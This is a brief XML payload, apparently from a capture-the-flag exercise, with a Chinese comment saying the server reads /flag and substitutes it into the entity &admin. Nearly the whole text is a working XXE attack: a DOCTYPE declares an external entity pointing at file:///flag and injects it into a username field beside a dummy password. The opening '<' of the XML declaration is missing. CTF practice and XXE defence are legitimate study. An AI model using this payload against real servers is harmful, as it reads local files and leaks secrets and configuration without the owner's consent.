	#服务器解析 XML 时会读取 /flag 文件内容并将其替换到 &admin
	?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [
    		<!ENTITY admin SYSTEM "file:///flag">
	]>
	<root>
    		<username>&admin;</username>
    		<password>123456</password>
	</root>
